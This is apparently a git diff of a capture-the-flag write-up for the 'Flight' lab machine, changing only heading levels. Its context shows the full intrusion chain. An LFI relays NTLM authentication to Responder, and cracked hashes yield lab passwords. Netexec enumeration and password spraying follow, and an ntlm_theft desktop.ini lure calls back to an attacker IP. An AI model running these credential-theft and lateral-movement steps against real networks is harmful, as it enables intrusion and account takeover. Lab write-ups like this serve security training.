@@ -52,7 +52,7 @@ school                  [Status: 200, Size: 3996, Words: 1045, Lines: 91, Durati
 
 Looking at the `http://school.flight.htb`, I notice the LFI attack vector.
 ![](Flight_Web0.png)
-###### NTLM_Relay_Attack_Through_LFI
+##### NTLM_Relay_Attack_Through_LFI
 
 Starting the responder and use the following payload after `view=` in the URL.
 ```
@@ -67,7 +67,7 @@ On the Responder side
 [SMB] NTLMv2-SSP Hash     : svc_apache::flight:982d58f09fdd403a:305F3D59F26F649EEFA867354F68A4EC:010100000000000000131CFC6C35DB0161F7ED32C7B726C300000000020008003200340052004E0001001E00570049004E002D004900500032005300450051005900390056004400490004003400570049004E002D00490050003200530045005100590039005600440049002E003200340052004E002E004C004F00430041004C00030014003200340052004E002E004C004F00430041004C00050014003200340052004E002E004C004F00430041004C000700080000131CFC6C35DB0106000400020000000800300030000000000000000000000000300000E94E52E16BE52276EB100527A5087DE7E2ED8A3603E5AE88EADD6EC0257A35060A0010000000000000000000000000000000000009001E0063006900660073002F00310030002E00310030002E00310034002E0033000000000000000000 
 ```
 
-###### Cracking_The_Hash
+##### Cracking_The_Hash
 ```
 # hashcat -m 5600 -a 0 NTLM_svc_apache /usr/share/wordlists/rockyou.txt
 SVC_APACHE::flight:982d58f09fdd403a:305f3d59f26f649eefa867354f68a4ec:010100000000000000131cfc6c35db0161f7ed32c7b726c300000000020008003200340052004e0001001e00570049004e002d004900500032005300450051005900390056004400490004003400570049004e002d00490050003200530045005100590039005600440049002e003200340052004e002e004c004f00430041004c00030014003200340052004e002e004c004f00430041004c00050014003200340052004e002e004c004f00430041004c000700080000131cfc6c35db0106000400020000000800300030000000000000000000000000300000e94e52e16be52276eb100527a5087de7e2ed8a3603e5ae88eadd6ec0257a35060a0010000000000000000000000000000000000009001e0063006900660073002f00310030002e00310030002e00310034002e0033000000000000000000:S@Ss!K@*t13
@@ -75,7 +75,7 @@ SVC_APACHE::flight:982d58f09fdd403a:305f3d59f26f649eefa867354f68a4ec:01010000000
 Session..........: hashcat
 Status...........: Cracked
 ```
-###### SMB-Enum-using-svc_apache
+##### SMB-Enum-using-svc_apache
 ```
 # netexec smb 10.10.11.187  -u 'svc_apache' -p 'S@Ss!K@*t13' --shares
 SMB         10.10.11.187    445    G0               [*] Windows 10 / Server 2019 Build 17763 x64 (name:G0) (domain:flight.htb) (signing:True) (SMBv1:False)
@@ -93,7 +93,7 @@ SMB         10.10.11.187    445    G0               Users           READ
 SMB         10.10.11.187    445    G0               Web             READ
 ```
 
-###### RID-Brute_Using-svc_apache
+##### RID-Brute_Using-svc_apache
 ```
 # netexec smb 10.10.11.187  -u 'svc_apache' -p 'S@Ss!K@*t13' --rid-brute
 SMB         10.10.11.187    445    G0               [*] Windows 10 / Server 2019 Build 17763 x64 (name:G0) (domain:flight.htb) (signing:True) (SMBv1:False)
@@ -180,7 +180,7 @@ SMB         10.10.11.187    445    G0               [-] flight\O.Possum:S@Ss!K@*
 SMB         10.10.11.187    445    G0               [-] flight\WebDevs:S@Ss!K@*t13 STATUS_LOGON_FAILURE 
 ```
 
-###### Failed_Evil-WinRM_for_User_Smoon
+##### Failed_Evil-WinRM_for_User_Smoon
 ```
 # evil-winrm -i 10.10.11.187 -u 'S.Moon' -p 'S@Ss!K@*t13'
 Evil-WinRM shell v3.5
@@ -209,7 +209,7 @@ SMB         10.10.11.187    445    G0               Web             READ
 ```
 
 Now that we have the `Write` access to `Shared`.
-###### ntlm_theft_stealing_NTLM_Hash
+##### ntlm_theft_stealing_NTLM_Hash
 ```
 ┌──(root㉿kali)-[/home/ringbuffer/Downloads/Tools/ntlm_theft]
 └─# python ntlm_theft.py -vv -g desktopini -s 10.10.14.5 -f flight_htb
@@ -246,7 +246,7 @@ On the Responder side
 
 ```
 
-###### Cracking_NTLM_Hash
+##### Cracking_NTLM_Hash
 ```
 ┌──(root㉿kali)-[/home/ringbuffer/Downloads/Flight.htb]
 └─# hashcat -m 5600 -a 0 ntlm_cbum  /usr/share/wordlists/rockyou.txt
@@ -257,7 +257,7 @@ Status...........: Cracked
 
 ```
 
-###### NetExec_SMB_Share_Enum
+##### NetExec_SMB_Share_Enum
 ```
 # netexec smb 10.10.11.187  -u 'c.bum' -p 'Tikkycoll_431012284' --shares
 SMB         10.10.11.187    445    G0               [*] Windows 10 / Server 2019 Build 17763 x64 (name:G0) (domain:flight.htb) (signing:True) (SMBv1:False)
